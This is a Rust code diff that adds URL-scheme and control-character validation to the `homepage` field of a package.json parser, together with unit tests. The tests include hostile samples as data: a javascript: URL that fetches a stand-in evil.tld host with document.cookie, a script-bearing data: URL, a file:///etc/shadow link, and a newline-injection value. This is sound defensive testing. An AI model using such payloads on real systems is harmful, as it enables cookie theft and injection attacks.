@@ -130,7 +130,19 @@ pub fn parse_package_json(project_root: &Path) -> Option<PackageJson> {
             LicenseField::Text(s) => trim_nonempty(Some(s)),
             LicenseField::Object { r#type } => trim_nonempty(r#type),
         }),
-        homepage: trim_nonempty(raw.homepage),
+        // SEC-2 / TASK-2222: `homepage` comes from the same untrusted
+        // `package.json` as `repository`, so it gets the same two policies
+        // via the shared `ops_about::text_util` helpers rather than a local
+        // copy: any control / Unicode formatting codepoint drops the field
+        // (mirroring SEC-2 / TASK-1165 on `repository` and TASK-1207 on the
+        // Python provider), and the scheme must be in the shared `http(s)`
+        // allowlist (SEC-11 / TASK-1755 / TASK-1722) — a `javascript:`,
+        // `data:`, or `file:` homepage renders as a clickable XSS /
+        // local-file link in every markdown / HTML consumer of
+        // `ops about --json`. Both rejections drop the field (rendered as
+        // missing), never strip, matching the drop-not-strip policy the
+        // crate already applies to `repository`.
+        homepage: pick_manifest_url(raw.homepage),
         // SEC-2 / TASK-1165: `normalize_repo_url` returns "" when the input
         // contains control bytes; surface that as a missing field rather than
         // an empty link in the About card.
@@ -164,6 +176,19 @@ pub fn parse_package_json(project_root: &Path) -> Option<PackageJson> {
 /// helper verbatim; the shared definition is the single drift surface for
 /// future tightening of ERR-2 trim semantics.
 pub use ops_about::text_util::trim_nonempty;
+
+/// SEC-2 / SEC-11 / TASK-2222: apply the shared manifest-URL policies to a
+/// `package.json` URL field — trim / drop-empty, then drop the whole field
+/// on any control / Unicode formatting codepoint, then require an
+/// allowlisted `http(s)` scheme. Mirrors `pick_url` in the Python provider
+/// (`extensions-python/about/src/lib.rs`, TASK-1207 / TASK-1755) so both
+/// stacks apply the identical chain through the identical shared helpers.
+fn pick_manifest_url(raw: Option<String>) -> Option<String> {
+    use ops_about::text_util::{contains_control_chars, has_allowed_url_scheme};
+    trim_nonempty(raw)
+        .filter(|s| !contains_control_chars(s))
+        .filter(|s| has_allowed_url_scheme(s))
+}
 
 fn format_person(p: PersonField) -> Option<String> {
     // ERR-2 (TASK-0566): trim and re-check empty so whitespace-only authors do
@@ -396,5 +421,76 @@ mod tests {
 
         let parsed = parse_package_json(dir.path()).expect("parsed");
         assert_eq!(parsed.repository, None);
+    }
+
+    /// SEC-2 / SEC-11 / TASK-2222 AC #4: a `javascript:` homepage is a live
+    /// XSS sink in any consumer that renders `ops about --json` output as a
+    /// hyperlink. The field must be dropped (rendered as missing), not
+    /// stripped — mirroring what `repository` already gets.
+    #[test]
+    fn parse_drops_homepage_with_javascript_scheme() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{
+                "name": "x",
+                "homepage": "javascript:fetch('https://evil.tld/?c='+document.cookie)"
+            }"#,
+        )
+        .unwrap();
+
+        let parsed = parse_package_json(dir.path()).expect("parsed");
+        assert_eq!(parsed.homepage, None);
+    }
+
+    /// SEC-11 / TASK-2222 AC #4: `data:` and `file:` homepages are dropped —
+    /// the same sinks the scheme allowlist already closes for `repository`
+    /// (TASK-1722).
+    #[test]
+    fn parse_drops_homepage_with_data_and_file_schemes() {
+        for homepage in [
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+            "file:///etc/shadow",
+        ] {
+            let dir = tempfile::tempdir().unwrap();
+            let pkg = format!(r#"{{"name":"x","homepage":"{homepage}"}}"#);
+            std::fs::write(dir.path().join("package.json"), pkg).unwrap();
+
+            let parsed = parse_package_json(dir.path()).expect("parsed");
+            assert_eq!(
+                parsed.homepage, None,
+                "homepage {homepage:?} must be dropped"
+            );
+        }
+    }
+
+    /// SEC-2 / TASK-2222 AC #4: an embedded LF forges an extra line in the
+    /// About card (and in log records); the field is dropped entirely.
+    #[test]
+    fn parse_drops_homepage_with_embedded_lf() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            "{\n  \"name\": \"x\",\n  \"homepage\": \"https://demo.dev\\nINJECT\"\n}\n",
+        )
+        .unwrap();
+
+        let parsed = parse_package_json(dir.path()).expect("parsed");
+        assert_eq!(parsed.homepage, None);
+    }
+
+    /// SEC-2 / SEC-11 / TASK-2222: an allowed-scheme, control-free homepage
+    /// keeps flowing — the gate must not eat the legitimate field.
+    #[test]
+    fn parse_keeps_legitimate_homepage() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(
+            dir.path().join("package.json"),
+            r#"{"name":"x","homepage":"https://demo.dev"}"#,
+        )
+        .unwrap();
+
+        let parsed = parse_package_json(dir.path()).expect("parsed");
+        assert_eq!(parsed.homepage.as_deref(), Some("https://demo.dev"));
     }
 }
